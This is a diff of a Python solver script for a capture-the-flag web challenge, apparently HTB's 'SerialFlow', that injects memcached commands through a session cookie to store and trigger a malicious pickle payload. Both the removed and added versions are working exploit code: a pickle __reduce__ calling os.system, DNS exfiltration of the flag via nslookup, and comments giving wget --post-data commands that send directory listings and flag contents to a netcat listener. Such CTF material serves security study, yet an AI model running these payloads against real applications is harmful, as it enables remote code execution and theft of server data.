@@ -1,93 +1,38 @@
-import pickle, os, requests, time
+# Original source: Pierre Vigier
+# https://pierre-vigier.github.io/blog/htb-cyber-apocalypse-2024/web-serialflow/
 
-HOST, PORT = "127.0.0.1", 1337
-CHALLENGE_URL = f"http://{HOST}:{PORT}"
-DNS_EXFIL = "8.8.8.8"
+import pickle
+import os
+from http import cookies
+import sys
+
+if len(sys.argv) < 2:
+    print("Command expected")
+    exit()
+
+cmd = sys.argv[1]
 
 class RCE:
-    def __init__(self, char):
-        self.char = char
-
     def __reduce__(self):
-        cmd = (f"echo -n '{self.char}'>>a")
-
         return os.system, (cmd,)
 
+payload = pickle.dumps(RCE(), 0)
+size = len(payload)
+cookie = 'k\r\nset k2 0 300 ' + str(size) + '\r\n'
+cookie += payload.decode() + '\r\n'
+cookie += 'get k2'
 
-class TriggerRCE:
-    def __reduce__(self):
-        cmd = (f"sh a")
-        return os.system, (cmd,)
+c = cookies.SimpleCookie()
+c["session"] = cookie
+print(c.output(header="Cookie:"))
 
-
-def generate_rce(char, trigger=False):
-    payload = pickle.dumps(RCE(char), 0)
-    if trigger: payload = pickle.dumps(TriggerRCE(), 0)
-    payload_size = len(payload)
-    cookie = b"1\r\nset injected 0 5 "
-    cookie += str.encode(str(payload_size))
-    cookie += str.encode("\r\n")
-    cookie += payload
-    cookie += str.encode("\r\n")
-    cookie += str.encode("get injected")
-
-    pack = ""
-    for x in list(cookie):
-        if x > 64:
-            pack += oct(x).replace("0o", "\\")
-        elif x < 8:
-            pack += oct(x).replace("0o", "\\00")
-        else:
-            pack += oct(x).replace("0o", "\\0")
-
-    return f"\"{pack}\""
-
-
-def generate_exploit(cmd):
-    cmd = " ".join(cmd) + " "
-    payload_list = []
-    for char in cmd:
-        if char == "\n":
-            payload_list.append(generate_rce(char, newline=True))
-        else:
-            payload_list.append(generate_rce(char))
-
-    return payload_list
-
-
-def pwn():
-    payload_file = f"nslookup $(cat /flag*).{DNS_EXFIL}"
-    exploit = generate_exploit(payload_file)
-    for char_payload in exploit:
-        while True:
-            time.sleep(1)
-            try:
-                resp = requests.get(f"{CHALLENGE_URL}/set", cookies={"session": char_payload})
-                if resp.status_code != 500 or resp.status_code != 200:
-                    break
-                else:
-                    requests.get(f"{CHALLENGE_URL}/")
-                    continue
-            except:
-                continue
-
-    trigger = generate_rce("", trigger=True)
-    while True:
-        time.sleep(1)
-        try:
-            resp = requests.get(f"{CHALLENGE_URL}/set", cookies={"session": trigger})
-            if resp.status_code != 302 or resp.status_code != 200:
-                break
-            else:
-                requests.get(f"{CHALLENGE_URL}/")
-                continue
-        except:
-            continue
-
-
-def main():
-    pwn()
-
-
-if __name__ == "__main__":
-        main()
+# this part was created by ToB to suit our challenge environment
+# then set up a netcat listener on the port where you'd like to receive the
+# data, e.g. nc -nlvp 1338 (on the host running the challenge container, but not
+# IN the challenge container)
+# then (using httpie's http command, or curl, to send a GET) run several times:
+# $ http 127.0.0.1:1337  "$(python solver2.py 'wget --post-data="$(ls /)"
+# 127.0.0.1:1338)"
+# to figure out the new flag filename; and then, finally:
+# http 127.0.0.1:1337 "$(python solver2.py 'wget --post-data="$(cat /<FLAG FILE
+# NAME>.txt)"')"
